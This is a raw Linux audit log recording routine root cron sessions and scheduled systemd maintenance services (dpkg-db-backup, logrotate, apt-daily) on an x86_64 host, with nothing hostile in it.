type=CRED_REFR msg=audit(1789413421.237:158): pid=913 uid=0 auid=0 ses=7 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789413421.241:159): pid=912 uid=0 auid=0 ses=7 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789413421.241:160): pid=912 uid=0 auid=0 ses=7 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789417021.261:161): pid=933 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789417021.261:162): pid=933 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789417021.261:163): pid=933 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=8 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789417021.261:163): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=933 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=8 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789417021.261:163): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789417021.261:164): pid=933 uid=0 auid=0 ses=8 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789417021.265:165): pid=934 uid=0 auid=0 ses=8 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789417021.265:166): pid=933 uid=0 auid=0 ses=8 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789417021.265:167): pid=933 uid=0 auid=0 ses=8 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789420621.285:168): pid=950 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789420621.285:169): pid=950 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789420621.285:170): pid=950 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=9 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789420621.285:170): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=950 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=9 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789420621.285:170): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789420621.289:171): pid=950 uid=0 auid=0 ses=9 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789420621.289:172): pid=951 uid=0 auid=0 ses=9 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789420621.293:173): pid=950 uid=0 auid=0 ses=9 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789420621.293:174): pid=950 uid=0 auid=0 ses=9 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789424221.313:175): pid=969 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789424221.313:176): pid=969 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789424221.313:177): pid=969 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=10 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789424221.313:177): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=969 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=10 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789424221.313:177): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789424221.317:178): pid=969 uid=0 auid=0 ses=10 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789424221.317:179): pid=970 uid=0 auid=0 ses=10 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789424221.321:180): pid=969 uid=0 auid=0 ses=10 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789424221.321:181): pid=969 uid=0 auid=0 ses=10 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=BPF msg=audit(1789426805.269:182): prog-id=12 op=LOAD
type=SERVICE_START msg=audit(1789426805.309:183): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=dpkg-db-backup comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789426805.309:184): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=dpkg-db-backup comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789426805.345:185): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=logrotate comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789426805.345:186): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=logrotate comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789426805.365:187): prog-id=12 op=UNLOAD
type=USER_ACCT msg=audit(1789427821.341:188): pid=1000 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789427821.341:189): pid=1000 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789427821.341:190): pid=1000 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=11 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789427821.341:190): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=1000 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=11 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789427821.341:190): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789427821.345:191): pid=1000 uid=0 auid=0 ses=11 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789427821.345:192): pid=1001 uid=0 auid=0 ses=11 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789427821.349:193): pid=1000 uid=0 auid=0 ses=11 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789427821.349:194): pid=1000 uid=0 auid=0 ses=11 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=SERVICE_START msg=audit(1789429001.032:195): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=apt-daily comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789429001.032:196): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=apt-daily comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789431421.867:197): pid=1065 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789431421.867:198): pid=1065 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789431421.867:199): pid=1065 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=12 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789431421.867:199): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=1065 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=12 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789431421.867:199): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789431421.867:200): pid=1065 uid=0 auid=0 ses=12 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789431421.871:201): pid=1066 uid=0 auid=0 ses=12 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789431421.875:202): pid=1065 uid=0 auid=0 ses=12 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789431421.875:203): pid=1065 uid=0 auid=0 ses=12 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789435021.897:204): pid=1082 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789435021.897:205): pid=1082 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789435021.897:206): pid=1082 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=13 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789435021.897:206): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=1082 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=13 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789435021.897:206): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789435021.897:207): pid=1082 uid=0 auid=0 ses=13 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789435021.901:208): pid=1083 uid=0 auid=0 ses=13 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789435021.905:209): pid=1082 uid=0 auid=0 ses=13 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789435021.905:210): pid=1082 uid=0 auid=0 ses=13 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789438201.926:211): pid=1100 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789438201.926:212): pid=1100 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789438201.926:213): pid=1100 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=14 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789438201.926:213): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=1100 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=14 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789438201.926:213): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789438201.930:214): pid=1100 uid=0 auid=0 ses=14 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789438201.934:215): pid=1101 uid=0 auid=0 ses=14 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789438201.934:216): pid=1100 uid=0 auid=0 ses=14 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789438201.934:217): pid=1100 uid=0 auid=0 ses=14 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789438621.942:218): pid=1105 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789438621.942:219): pid=1105 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789438621.942:220): pid=1105 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=15 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789438621.942:220): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=1105 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=15 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789438621.942:220): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789438621.942:221): pid=1105 uid=0 auid=0 ses=15 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789438621.946:222): pid=1106 uid=0 auid=0 ses=15 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789438621.950:223): pid=1105 uid=0 auid=0 ses=15 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789438621.950:224): pid=1105 uid=0 auid=0 ses=15 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789442221.987:225): pid=1122 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789442221.987:226): pid=1122 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789442221.987:227): pid=1122 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=16 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789442221.987:227): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=1122 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=16 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789442221.987:227): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789442221.987:228): pid=1122 uid=0 auid=0 ses=16 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789442221.991:229): pid=1123 uid=0 auid=0 ses=16 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789442221.995:230): pid=1122 uid=0 auid=0 ses=16 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789442221.995:231): pid=1122 uid=0 auid=0 ses=16 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789445821.016:232): pid=1139 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789445821.016:233): pid=1139 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789445821.016:234): pid=1139 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=17 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789445821.016:234): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=1139 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=17 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789445821.016:234): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789445821.016:235): pid=1139 uid=0 auid=0 ses=17 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789445821.020:236): pid=1140 uid=0 auid=0 ses=17 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789445821.020:237): pid=1139 uid=0 auid=0 ses=17 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789445821.020:238): pid=1139 uid=0 auid=0 ses=17 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789449421.039:239): pid=1156 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789449421.039:240): pid=1156 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789449421.039:241): pid=1156 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=18 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789449421.039:241): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7fff6b6c6cd0 a2=1 a3=7fff6b6c69e7 items=0 ppid=515 pid=1156 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=18 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789449421.039:241): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789449421.039:242): pid=1156 uid=0 auid=0 ses=18 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789449421.043:243): pid=1157 uid=0 auid=0 ses=18 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789449421.047:244): pid=1156 uid=0 auid=0 ses=18 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789449421.047:245): pid=1156 uid=0 auid=0 ses=18 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789449901.054:246): pid=1162 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789449901.054:247): pid=1162 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
